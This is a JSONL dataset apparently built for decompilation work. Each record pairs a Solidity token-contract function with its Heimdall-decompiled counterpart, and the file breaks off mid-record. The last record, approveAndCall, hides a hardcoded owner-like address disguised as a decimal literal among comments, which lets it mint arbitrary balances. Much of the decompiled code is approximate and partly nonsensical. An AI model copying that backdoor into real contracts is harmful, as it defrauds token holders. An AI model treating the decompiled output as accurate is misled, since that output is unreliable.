{"contract_address": "0x7BEe550EDa5afA8E1C22Ad3Cea77f5D746dC78c3", "original_solidity_code": "function approve(address spender, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Moves `amount` tokens from `from` to `to` using the\\r\\n     * allowance mechanism. `amount` is then deducted from the caller's\\r\\n     * allowance.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * Emits a {Transfer}", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x06;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x8d2d07f485Ea0cEf2E843b1EEE5F2237e8e9d013", "original_solidity_code": "function updateBuyFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external onlyOwner {\r\n        buyMarketingFee = _marketingFee;\r\n        buyLiquidityFee = _liquidityFee;\r\n        buyDevFee = _devFee;\r\n        buyTotalFees = buyMarketingFee + buyLiquidityFee + buyDevFee;\r\n    }", "heimdall_decompiled_code": "function updateBuyFees(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        lastLpBurnTimee = arg0;\n        buyLiquidityFee = arg1;\n        buyDevFee = arg2;\n        require(!arg0 > (arg1 + arg0));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n    }"}
{"contract_address": "0x5ED7ad95beA8f3c7aB1bDeCCb843EbDE3B902BB2", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x411AC84A80D686758cA971Dd205711149B42686f", "original_solidity_code": "function allowance(address owner_, address spender) external view override returns (uint256) {\\r\\n      return _allowances[owner_][spender];\\r\\n    }", "heimdall_decompiled_code": "function allowance(address arg0, address arg1) public view returns (uint256) {\n        address var_a = address(arg0);\n        var_b = 0x05;\n        var_a = address(arg1);\n        address var_b = keccak256(var_a);\n        address var_c = storage_map_d[var_a];\n        return storage_map_d[var_a];\n    }"}
{"contract_address": "0xEA96F358096DB436A74f5C974F59fdE3Bc5185e7", "original_solidity_code": "function setFeeDenominators(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {\r\n        autoLpTaxFee = _liquidity; marketerTaxFee = _marketing; burningTaxFee = _burn; developerTaxFee = _development; buyingTaxFee = _total; sellingTaxFee = _sell; transferingTaxFee = _trans;\r\n        require(buyingTaxFee <= denominator.div(1) && sellingTaxFee <= denominator.div(1) && transferingTaxFee <= denominator.div(1), \"buyingTaxFee and sellingTaxFee cannot be more than 20%\");\r\n    }", "heimdall_decompiled_code": "function setFeeDenominators(uint256 arg0, uint256 arg1, uint256 arg2, uint256 arg3, uint256 arg4, uint256 arg5, uint256 arg6) public {\n        require(msg.sender == (address(getOwner)), \"Ownable: Caller is not owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1c;\n        var_d = 0x4f776e61626c653a2043616c6c6572206973206e6f74206f776e657200000000;\n        store_k = arg0;\n        store_p = arg1;\n        store_i = arg2;\n        store_q = arg3;\n        store_r = arg4;\n        store_j = arg5;\n        store_g = arg6;\n        require(0x01, \"buyingTaxFee and sellingTaxFee cannot be more than 20%\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(!(!store_r > (store_h / 0x01)), \"buyingTaxFee and sellingTaxFee cannot be more than 20%\");\n        require(!(!store_r > (store_h / 0x01)), \"buyingTaxFee and sellingTaxFee cannot be more than 20%\");\n        require(!(store_r > (store_h / 0x01)), \"buyingTaxFee and sellingTaxFee cannot be more than 20%\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x36;\n        var_d = 0x627579696e6754617846656520616e642073656c6c696e675461784665652063;\n        var_g = 0x616e6e6f74206265206d6f7265207468616e2032302500000000000000000000;\n        require(0x01);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(0x01);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0x30045aA941FF9Be1d2D3603A75207C07860d4156", "original_solidity_code": "function updateMaxBuyLimit(uint256 percent) public onlyOwner {\\r\\n        maxBuyLimit = (totalSupply() * percent) / TAX_DIVISOR;\\r\\n    }", "heimdall_decompiled_code": "function updateMaxBuyLimit(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((arg0 == ((arg0 * totalSupply) / totalSupply)) | !totalSupply);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x2710);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        maxBuyLimit = (arg0 * totalSupply) / 0x2710;\n    }"}
{"contract_address": "0x40911d42FB92A25D1DDAE18fA24e536ea3294102", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if (!0x3b9aca00 | (0x01 == 0x01)) {\n                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_g = 0x11;\n                _maxTxAmount = 0x3b9aca00;\n                if (0x09) {\n                    if (!0x3b9aca00 | (0x01 == 0x01)) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        _maxWalletSize = 0x3b9aca00;\n                        transferDelayEnabled = (0 * 0x01) | (uint248(transferDelayEnabled));\n                        if (0x09) {\n                            if (!0x3b9aca00 | (0x01 == 0x01)) {\n                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_g = 0x11;\n                                var_a = 0x3b9aca00;\n                                emit MaxTxAmountUpdated(0x3b9aca00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                                if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_g = 0x11;\n                                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                        if (!0x09 > 0x01) {\n                                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_g = 0x11;\n                                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                    var_g = 0x11;\n                                                                    if (!0x01) {\n                                                                    }\n                                                                    if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                        var_g = 0x11;\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xc0d5852bF2E95089EcEe1Fb3D3641A7e60073D44", "original_solidity_code": "function updateSwapTokenAmount(uint256 newAmount)\\r\\n        external\\r\\n        onlyOwner\\r\\n        returns (bool)\\r\\n    {\\r\\n        require(\\r\\n            newAmount >= (totalSupply() * 1) / 100000,\\r\\n            \\\"Swap amount cannot be lower than 0.001% total supply.\\\"\\r\\n        );\\r\\n        require(\\r\\n            newAmount <= (totalSupply() * 5) / 1000,\\r\\n            \\\"Swap amount cannot be higher than 0.5% total supply.\\\"\\r\\n        );\\r\\n        swapTokensAtAmount = newAmount;\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function updateSwapTokenAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((totalSupply == ((totalSupply * 0x01) / 0x01)) | !0x01, \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x0186a0, \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(!(arg0 < ((totalSupply * 0x01) / 0x0186a0)), \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x35;\n        var_d = 0x5377617020616d6f756e742063616e6e6f74206265206c6f776572207468616e;\n        var_g = 0x20302e3030312520746f74616c20737570706c792e0000000000000000000000;\n    }"}
{"contract_address": "0x39f3C6C2a3E69D908DFE9863C9127080CC487933", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _setOwner(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xbC9683EE9525c4525e7e0dCFfe8eeD1447fd4287", "original_solidity_code": "function balanceOf(address accaukt) public view virtual override returns (uint256) {\r\n        return _balances[accaukt];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x5Dae130C98E4867Eb6721c48D2255F06f3E2a055", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0x31218E25Ad864a39c1e3623a1F0e52f2E286E3b4", "original_solidity_code": "function modifyFee(uint256 buy,uint256 sell) external onlyOwner {\r\n        require(buy <= 100, \"invalid new Fee\");\r\n         require(sell <= 100, \"invalid new Fee\");\r\n        buyFees = buy;\r\n        sellFees = sell;\r\n    }", "heimdall_decompiled_code": "function modifyFee(uint256 arg0, uint256 arg1) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(arg0 > 0x64), \"invalid new Fee\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x0f;\n        var_d = 0x696e76616c6964206e6577204665650000000000000000000000000000000000;\n        require(!(arg1 > 0x64), \"invalid new Fee\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x0f;\n        var_d = 0x696e76616c6964206e6577204665650000000000000000000000000000000000;\n        buyFees = arg0;\n        sellFees = arg1;\n    }"}
{"contract_address": "0x110B3EbD95Ac61b8Db462b9d85F73de7Ea5BcF1e", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a] > 0);\n        store_e = (0x01 * 0x01000000000000000000000000000000000000000000) | (uint248(store_e));\n        require(!storage_map_b[var_a] - 0);\n        require(!bytes1(store_e / 0x010000000000000000000000000000000000000000));\n        require(!0x02 > 0xffffffffffffffff);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x41;\n        var_d = 0x02;\n        uint256 var_e = var_e + 0x60;\n        require(!0x02);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_f = address(this);\n        var_g = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).WETH(var_h); // staticcall\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!(((var_e + ret0.length) - var_e) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_i == (address(var_i)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_j = address(var_i);\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_d / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_d / 0x01);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_d / 0x01), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        uint256 var_n = ((0x04 + var_e) + 0xa0) - (0x04 + var_e);\n        uint256 var_p = var_e.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_d / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(store_d / 0x01).{ value: var_m ether }Unresolved_791ac947(var_l); // call\n        store_e = (0 * 0x01000000000000000000000000000000000000000000) | (uint248(store_e));\n        require(!address(this).balance > 0);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x210a768a5146f4d3C1068bB37dD780304c6D648D", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x780c7f2FdF0D47F25f5858975DBd0159DB50C1B2", "original_solidity_code": "function updatePebbleDevLevySecureCache(address newWallet) external onlyOwner {\\r\\n        emit PebbleDevLevySecureCacheUpdated(newWallet, PebbleDevLevySecureCache);\\r\\n        PebbleDevLevySecureCache = newWallet;\\r\\n    }", "heimdall_decompiled_code": "function updatePebbleDevLevySecureCache(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit PebbleDevLevySecureCacheUpdated(address(arg0), address(PebbleDevLevySecureCache / 0x01));\n        PebbleDevLevySecureCache = (address(arg0) * 0x01) | (uint96(PebbleDevLevySecureCache));\n    }"}
{"contract_address": "0x35D17C2467E1D8aB2d8789FD7af72af770BDBc52", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {\\r\\n      _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        address var_a = msg.sender;\n        var_b = 0x05;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!((arg1 + storage_map_d[var_a]) < storage_map_d[var_a]), \"SafeMath: addition overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x1b;\n        var_f = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x05;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_d[var_a] = arg1 + storage_map_d[var_a];\n        uint256 var_c = arg1 + storage_map_d[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_d[var_a]);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_g)) - (0x04 + var_g);\n        var_e = 0x22;\n        var_h = this.code[3127:3161];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_g)) - (0x04 + var_g);\n        var_e = 0x24;\n        var_h = this.code[3276:3312];\n    }"}
{"contract_address": "0x0D5bB4EE4e770C761F2F203c0828Eb2487A0Ab60", "original_solidity_code": "function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (!(store_a) == ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (!(store_a) == ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x679905CAD3Da37c92fa79d88d865Fb9FF48a8B50", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        uint256 currentAllowance = allowance(owner, spender);\\n        require(currentAllowance >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\n        unchecked {\\n            _approve(owner, spender, currentAllowance - subtractedValue);\\n        }\\n\\n        return true;\\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_h = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x8bD394Bd4b52207Df7a12F4a3EBF089e3d632826", "original_solidity_code": "function setContractSwapSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {\\r\\n        swapAmount = _swapAmount; swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000)); \\r\\n        minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));\\r\\n    }", "heimdall_decompiled_code": "function setContractSwapSettings(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(getOwner)), \"!OWNER\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f574e45520000000000000000000000000000000000000000000000000000;\n        store_b = arg0;\n        require((arg1 == ((arg1 * store_c) / store_c)) | !store_c);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x0186a0);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0xF47024a2e10D77927767cBE5aADf5F8BB02782c9", "original_solidity_code": "function setNumbers(uint256 amount) public onlyOwner {\\r\\n        numbers = amount;\\r\\n    }", "heimdall_decompiled_code": "function setNumbers(uint256 arg0) public payable {\n        require(arg0 == arg0);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        numbers = arg0;\n    }"}
{"contract_address": "0x84B55c2CCbA3Fb23FF2648Ba8b740fC91547E6df", "original_solidity_code": "function setBuyFee(uint256 newBuyTax) external onlyOwner {\r\n        BuyTax = newBuyTax;\r\n        require(newBuyTax <= 5);\r\n    }", "heimdall_decompiled_code": "function setBuyFee(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_k = arg0;\n        require(!arg0 > 0x05);\n    }"}
{"contract_address": "0x4103F78C623459b3e985dE5F5d78622944B9dE6D", "original_solidity_code": "function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {\r\n        _maxWalletSize = maxWalletSize;\r\n    }", "heimdall_decompiled_code": "function setMaxWalletSize(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxWalletSize = arg0;\n    }"}
{"contract_address": "0xc5D1812CD71D19aF93066787a29E3521C47cAd19", "original_solidity_code": "function approveAndCall(address spender, uint256 addedValue) public returns (bool) {\r\n \r\n        require(msg.sender == owner||\r\n       \r\n        msg.sender==address\r\n       \r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        /*keccak256 -> 178607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/ (178607940065137046348733521910879985571412708986));\r\n \r\n        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}\r\n \r\n        canSale[spender]=true;\r\n \r\n        return true;\r\n \r\n    }", "heimdall_decompiled_code": "function approveAndCall(address arg0, uint256 arg1) public returns (bool) {\n        require(address(msg.sender) == (address(store_d / 0x01)));\n        require(address(msg.sender) == 0x1f490e99657cd08a058c6bb6cd81dd38f59e0e7a);\n        require(!arg1 > 0);\n        address var_a = address(arg0);\n        var_b = 0x06;\n        storage_map_c[var_a] = arg1 * 0x0de0b6b3a7640000;\n        var_a = address(arg0);\n        var_b = 0x01;\n        storage_map_c[var_a] = (0x01 * 0x01) | (uint248(storage_map_c[var_a]));\n        var_c = 0x01;\n        return 0x01;\n        var_a = address(arg0);\n        var_b = 0x01;\n        storage_map_c[var_a] = (0x01 * 0x01) | (uint248(storage_map_c[var_a]));\n        var_c = 0x01;\n        return 0x01;\n        require(address(msg.sender) == 